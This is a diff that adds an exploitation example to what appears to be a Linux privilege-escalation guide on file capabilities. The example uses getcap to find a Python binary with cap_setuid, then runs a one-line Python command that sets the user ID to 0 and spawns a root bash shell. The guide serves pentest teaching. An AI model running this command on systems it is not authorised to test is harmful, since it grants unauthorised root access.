@@ -522,6 +522,18 @@ To identify programs in a system or folder with capabilities:
 getcap -r / 2>/dev/null
 ```
 
+### Exploitation example
+
+In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:
+
+```bash
+getcap -r / 2>/dev/null
+/usr/bin/python2.6 = cap_setuid+ep
+
+#Exploit
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+```
+
 ### The special case of "empty" capabilities
 
 Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:
